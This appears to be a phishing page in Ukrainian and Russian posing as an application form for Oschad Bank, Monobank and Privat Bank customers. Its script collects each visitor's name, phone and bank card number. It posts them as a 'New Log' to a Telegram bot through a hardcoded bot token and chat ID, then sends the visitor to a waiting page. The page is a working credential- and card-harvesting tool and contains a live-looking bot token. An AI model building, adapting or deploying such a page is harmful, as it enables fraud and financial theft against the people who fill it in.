<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Заявка</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#f1f5f9;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  background:white;
  padding:30px;
  border-radius:20px;
  width:340px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
  text-align:center;
}

h2{
  margin-bottom:15px;
  color:#0f172a;
}

input{
  width:100%;
  padding:12px;
  margin:6px 0;
  border:1px solid #e2e8f0;
  border-radius:10px;
  outline:none;
}

.service{
  background:#f1f5f9;
  padding:10px;
  margin:6px 0;
  border-radius:10px;
  cursor:pointer;
}

.service.active{
  background:#3b82f6;
  color:white;
}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  border:none;
  border-radius:10px;
  background:#3b82f6;
  color:white;
  cursor:pointer;
}

button:hover{
  background:#2563eb;
}
</style>
</head>

<body>

<div class="box">
  <h2>Відправити заявку</h2>

  <input type="text" id="name" placeholder="Имя">
  <input type="text" id="phone" placeholder="Телефон">
  <input type="text" id="telegram" placeholder="Номер картки">

  <p>Виберіть ваш Банк:</p>

  <div class="service" onclick="select(this)">Oschad Bank</div>
  <div class="service" onclick="select(this)">Monobank</div>
  <div class="service" onclick="select(this)">Privat Bank</div>

  <button onclick="send()">Отримати</button>
</div>

<script>
let service = "";

function select(el){
  document.querySelectorAll(".service").forEach(e=>e.classList.remove("active"));
  el.classList.add("active");
  service = el.innerText;
}

function send(){
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const tg = document.getElementById("telegram").value.trim();

  if(!name || !phone || !tg || !service){
    alert("Заповніть все!");
    return;
  }

  const id = Date.now();

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:chat_id,
      text:`🔥 Новый Лог 👻
ID: ${id}
Имя🦣: ${name}
Телефон📱: ${phone}
Карта💳: ${tg}
Банк🏧: ${service}

👉 Ожидание: /wait.html?id=${id}`
    })
  });

  window.location.href = "wait.html?id=" + id;
}
</script>

</body>
</html>
